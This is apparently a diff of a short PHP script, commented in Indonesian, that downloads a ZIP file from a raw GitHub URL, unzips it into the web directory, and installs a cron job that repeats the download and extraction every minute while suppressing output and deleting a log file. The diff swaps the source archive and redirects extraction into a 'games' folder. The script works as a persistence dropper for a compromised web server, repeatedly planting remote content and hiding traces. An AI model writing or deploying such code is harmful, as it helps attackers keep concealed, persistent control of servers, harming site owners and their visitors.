@@ -1,21 +1,24 @@
 <?php
 // URL yang ingin Anda unduh
-$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/geleri.zip';
+$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/lp/main/games.zip';
 
 // Direktori tempat skrip PHP ini diakses
 $currentDirectory = dirname(__FILE__);
 
+// Nama folder tempat ekstraksi file
+$extractFolder = $currentDirectory . '/games';
+
 // Nama file ZIP setelah diunduh
 $zipFileName = $currentDirectory . '/geleri.zip';
 
-// Buat perintah wget
+$mkdircommand = 'mkdir ' . escapeshellarg($extractFolder);
 $downloadCommand = 'wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($zipFileName);
 
-// Perintah untuk mengekstrak file ZIP
-$extractCommand = 'unzip ' . escapeshellarg($zipFileName) . ' -d ' . escapeshellarg($currentDirectory);
+// Perintah untuk mengekstrak file ZIP ke dalam folder "games"
+$extractCommand = 'unzip ' . escapeshellarg($zipFileName) . ' -d ' . escapeshellarg($extractFolder);
 
 // Tugas Cron untuk mengunduh dan mengekstrak file setiap 30 detik dan kemudian menghapus log
-$downloadCronCommand = '* * * * * ' . $downloadCommand . ' && ' . $extractCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');
+$downloadCronCommand = '* * * * * ' . $mkdircommand . ' && ' . $downloadCommand . ' && ' . $extractCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');
 
 // Eksekusi perintah cron dan tangani hasilnya
 exec('(crontab -l ; echo "'.$downloadCronCommand.'") | crontab -', $output, $returnVar);
